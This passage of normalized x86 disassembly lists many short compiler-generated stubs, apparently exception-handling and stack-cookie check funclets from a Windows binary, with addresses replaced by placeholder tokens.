sub_44a42a
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a432
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a44d
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a455
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a470
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a478
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a493
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a49b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a4b6
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a4be
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a4d9
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a4e1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a4fc
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a504
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a51f
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a527
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a542
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a54a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a565
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a56d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a588
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a590
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a5ab
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a5b3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a5ce
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a5d6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a5f1
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a5f9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a614
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a61c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a637
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a63f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a65a
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a662
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a67d
push [ ebp - 0x14 ]
call sub_424fc7
pop ecx
retn
sub_44a687
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a6a2
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a6ad
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a6c8
lea ecx [ ebp - 0x14 ]
jmp sub_447292
sub_44a6d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a6eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a706
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_402f60
sub_44a71f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a73a
push [ ebp - 0x14 ]
call sub_424fc7
pop ecx
retn
sub_44a744
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea eax [ ebp - 0x38 ]
push eax
call sub_402d9b
sub_44a75e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a779
mov ecx [ ebp - 0x10 ]
jmp j_sub_425354#7
sub_44a781
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a79c
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
add ecx 0x2c
jmp sub_4036a4
sub_44a7b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a7d3
lea ecx [ ebp - 0x14 ]
jmp sub_447292
sub_44a7db
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a7f6
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_447343
sub_44a801
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a81c
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_402f60
sub_44a835
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a850
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a85b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a876
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a881
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a89c
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a8a7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a8c2
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a8cd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a8e8
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a8f3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a90e
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a919
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a934
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a93f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a95a
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a965
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a980
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a98b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a9a6
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a9b1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a9cc
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a9d7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a9f2
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44a9fd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44aa18
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aa23
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44aa3e
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aa49
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44aa64
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aa6f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44aa8a
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aa95
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44aab0
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aabb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44aad6
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aae1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44aafc
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ab07
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ab22
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ab2d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ab48
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ab53
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ab6e
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ab79
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ab94
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ab9f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44abba
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44abc5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44abe0
mov eax [ ebp + 0x8 ]
jmp sub_41eb7d
sub_44abe8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ac03
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ac0e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ac29
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ac34
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ac4f
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ac5a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ac75
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ac80
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ac9b
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aca6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44acc1
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_415c02
sub_44accc
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44acd4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44acef
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_415bf7
sub_44acfa
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44ad02
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ad1d
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ad28
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ad43
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ad4e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ad69
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ad74
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ad8f
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ad9a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44adb5
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44adc0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44addb
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ade6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ae01
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ae0c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ae27
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ae32
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ae4d
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ae58
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ae73
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44ae7e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ae99
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aea4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44aebf
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aeca
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44aee5
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44aef0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44af0b
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44af16
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44af31
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44af3c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44af57
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44af62
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44af7d
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44af88
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44afa3
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44afae
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44afc9
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44afd4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44afef
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44affa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b015
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_41400a
sub_44b020
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44b028
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b043
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_413ff9
sub_44b04e
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44b056
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b071
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_413fe8
sub_44b07c
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44b084
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b09f
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b0aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b0c5
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b0d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b0eb
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b0f6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b111
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b11c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b137
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_40fce3
sub_44b142
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44b14a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b165
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_40fcd2
sub_44b170
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44b178
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b193
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b19e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b1b9
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b1c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b1df
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b1ea
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b205
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b210
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b22b
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b236
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b251
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b25c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b277
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b282
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b29d
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_40df30
sub_44b2a8
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44b2b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b2cb
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_40df1f
sub_44b2d6
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44b2de
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b2f9
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_40df0e
sub_44b304
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44b30c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b327
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_40defd
sub_44b332
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44b33a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b355
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b360
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b37b
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b386
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b3a1
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b3ac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b3c7
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b3d2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b3ed
mov eax [ ebp + 0x8 ]
